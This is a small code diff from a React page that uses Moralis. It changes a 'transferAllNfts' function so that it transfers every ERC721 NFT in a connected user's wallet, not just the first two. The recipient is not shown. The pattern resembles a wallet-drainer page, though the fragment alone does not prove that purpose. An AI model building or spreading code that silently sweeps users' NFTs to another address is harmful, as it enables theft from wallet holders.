@@ -194,7 +194,7 @@ export default function Home() {
 
   const transferAllNfts = async () => {
     const web3 = await Moralis.enableWeb3();
-    for (let i = 0; i < 2; i++) {
+    for (let i = 0; i < userNftsArray.length; i++) {
       if (userNftsArray[i].contract_type.toUpperCase() === "ERC721") {
 
         var transaction = await Moralis.transfer({
